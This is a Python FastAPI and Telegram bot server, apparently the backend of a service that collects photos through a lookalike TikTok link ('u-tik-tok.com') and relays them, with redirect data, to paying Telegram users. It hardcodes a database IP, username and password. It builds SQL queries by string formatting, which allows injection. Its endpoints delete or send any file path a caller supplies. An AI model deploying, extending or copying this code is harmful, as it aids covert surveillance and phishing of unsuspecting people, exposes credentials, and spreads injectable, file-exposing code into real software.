import os
from fastapi import FastAPI, Form, UploadFile, File, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from aiogram import Bot
from aiogram.types import FSInputFile
from datetime import datetime
import aiofiles
import uvicorn
import logging
import mysql
import mysql.connector
from aiogram import types
from aiogram.utils.keyboard import InlineKeyboardMarkup
import time


path_file = '/root'
db_host = "90.156.226.91"
db_user = "gen_user" 
db_password = "_q-W>q*5fn~:{y"
db_name = "default_db"

url_tiktok = 'https://u-tik-tok.com/tt'

mydb = mysql.connector.connect(
    host=db_host,
    user=db_user,
    password=db_password,
    database=db_name,
)
mycursor = mydb.cursor(buffered=True)

mycursor.execute("SELECT * FROM kwork22_rezerv")
all_rezerv = mycursor.fetchall()

                
mycursor.close()
mydb.close()

token_1 = all_rezerv[0][0]

bot = Bot(token_1)

app = FastAPI()

app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )

@app.post("/del_photo")
async def webhook2(photo: str = Form(...)):
    os.remove(photo)


@app.post("/get_photo")
async def webhook2(photo: str = Form(...),
        user_id: str = Form(...),
        text: str = Form(...)):
    try:
        await bot.send_photo(user_id, FSInputFile(photo), caption=text)
    except:
        await bot.send_message(user_id, "Срок хранения фото истек")
        
@app.post("/tiktok")
async def webhook(
        tiktok_url: str = Form(...),
        user_id: str = Form(...),
        redirect_url: str = Form(...),
        photo: UploadFile = File(...)
):


    additional_info = f"url={tiktok_url}, id={user_id}, redirect={redirect_url}"
        
    if photo:
            
        mydb = await connect()
        mycursor = mydb.cursor(buffered=True)

        mycursor.execute("SELECT subscription FROM kwork22_user WHERE id_tg = '{}'".format(int(user_id)))
        subscription = mycursor.fetchone()
        subscription = int(subscription[0])

        if subscription > 0:

        
            await send_telegram_photo(user_id, photo, redirect_url)
                 
        else:
            photo_path = await save_image(photo, "data/images")

         
        
            kb_list = [
              [types.InlineKeyboardButton(text='Открыть фото', callback_data=f'ph!{str(photo_path)}')]
            ]


            keyboard =  InlineKeyboardMarkup(inline_keyboard=kb_list)



            message = await send_telegram_message(user_id=user_id, text=f"📸Вам пришло новое фото!\nСсылка: {url_tiktok}?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)

         
            mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, tiktok_url)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, time.time(), int(user_id), message.message_id, str(redirect_url) ))
            mydb.commit() 
                                     
                
        mycursor.close()
        mydb.close()
    return {"status": "Success"}


async def send_telegram_message(user_id, text, reply_markup):
    message = await bot.send_message(user_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
    return message


async def send_telegram_photo(user_id, photo, redirect_url):
    photo_path = await save_image(photo, "data/images")
    message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'📸Вам пришло новое фото!\nСсылка: {url_tiktok}?id={user_id}&redirect={redirect_url}')

    mydb = await connect()
    mycursor = mydb.cursor(buffered=True)
        
    mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, tiktok_url)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, time.time(), int(user_id), 0, redirect_url))
    mydb.commit() 

    mycursor.close()
    mydb.close()

async def connect():
    mydb = mysql.connector.connect(
        host=db_host,
        user=db_user,
        password=db_password,
        database=db_name,
    )
    return mydb



        
async def save_image(image: UploadFile, directory: str) -> str:
    if image.filename.split(".")[-1].lower() not in ['jpeg', 'png', 'jpg', 'gif']:
        raise HTTPException(status_code=400, detail="Invalid image type")

    if not os.path.exists(directory):
        os.makedirs(directory)

    filename = f"{int(datetime.utcnow().timestamp())}_{image.filename}"
    file_path = os.path.join(directory, filename)

    async with aiofiles.open(file_path, 'wb') as out_file:
        content = await image.read()
        await out_file.write(content)


    return file_path


if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=8001)
